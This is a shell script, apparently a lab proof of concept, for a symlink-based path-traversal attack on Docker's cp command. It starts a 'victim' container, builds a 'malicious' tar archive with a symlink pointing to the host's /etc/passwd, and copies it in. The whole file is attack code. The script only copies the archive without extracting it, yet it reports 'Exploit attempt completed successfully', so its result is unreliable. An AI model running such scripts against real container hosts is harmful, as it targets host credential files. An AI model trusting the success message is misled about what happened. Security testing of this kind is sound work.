#!/bin/sh
# Wait for Docker daemon to become reachable via HTTP ping
while ! curl -s http://dind:2375/_ping | grep -q OK; do
  echo "Waiting for dind daemon..."
  sleep 1
done

# Start a victim container
docker run -d --name victim alpine sleep 1000

# Create a malicious tar archive with a symlink pointing to a host path
mkdir -p /tmp/mal
echo "malicious" > /tmp/mal/payload.txt
ln -s /etc/passwd /tmp/mal/evil
tar -C /tmp/mal -cf /tmp/malicious.tar .

# Copy the archive into the victim container using the Docker CLI
docker cp /tmp/malicious.tar victim:/tmp/malicious.tar

if [ $? -eq 0 ]; then
  echo "Exploit attempt completed successfully"
else
  echo "Exploit attempt failed"
fi

# Keep the container alive long enough for logs to be inspected, then exit
sleep 2